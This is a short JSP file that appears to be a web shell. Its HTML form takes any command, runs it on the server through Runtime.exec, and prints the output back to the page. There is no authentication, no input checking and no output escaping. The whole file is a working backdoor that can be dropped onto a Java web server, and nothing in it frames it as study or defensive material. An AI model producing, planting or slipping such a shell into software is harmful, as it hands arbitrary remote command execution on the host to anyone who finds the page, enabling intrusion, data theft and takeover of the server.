<%@ page import="java.util.*,java.io.*"%>

<%
    // Get the list of command outputs from the session
    List<String> commandOutputs = (List<String>) session.getAttribute("commandOutputs");
    if (commandOutputs == null) {
        commandOutputs = new ArrayList<>();
        session.setAttribute("commandOutputs", commandOutputs);
    }

    if (request.getMethod().equals("POST")) {
        String command = request.getParameter("cmd");
        if (command != null && !command.isEmpty()) {
            commandOutputs.add("> " + command);

            // Add clear functionality to delete previous history
            if (command.equals("clear")) {
                commandOutputs.clear(); // Clear the list of command outputs
            } else {
                try {
                    Process proc = Runtime.getRuntime().exec(command);
                    InputStream in = proc.getInputStream();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(in));
                    String line;
                    StringBuilder commandOutput = new StringBuilder();

                    // Read command output line by line and append to StringBuilder
                    while ((line = reader.readLine()) != null) {
                        commandOutput.append(line).append("<BR>");
                    }

                    // Add command output to the list of outputs
                    commandOutputs.add(commandOutput.toString());

                    // Close resources
                    reader.close();
                    in.close();
                } catch (IOException e) {
                    commandOutputs.add("Error executing command: " + e.getMessage());
                }
            }
        }
    }


%>
<!DOCTYPE html>
<html>
<body>
    <form method="post">
        Enter command: <input type="text" name="cmd">
        <input type="submit" value="Execute">
    </form>

    <% for (String output : commandOutputs) { %>
        <%= output %><BR>
    <% } %>
</body>
</html>